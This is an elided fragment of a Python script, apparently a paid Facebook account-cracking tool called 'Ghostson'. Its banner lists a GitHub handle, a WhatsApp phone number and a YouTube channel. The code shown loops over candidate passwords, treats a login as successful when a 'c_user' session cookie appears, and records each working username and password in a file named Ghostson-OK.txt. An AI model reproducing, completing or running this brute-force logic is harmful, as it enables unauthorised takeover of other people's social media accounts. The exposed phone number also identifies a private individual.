...
logo="""_________________Ghostson👻_______________
___________________________________________
Github : Ghostson
Whatsapp : 09138017570
YOUTUBE  : Ghostson Dehacker
VERSION : 1.1
Tool : Paid Tool
___________________________________________
___________________________________________"""
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [GHOSTED-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Ghostson-OK.txt' , 'a').write('%s\n' % wrt)
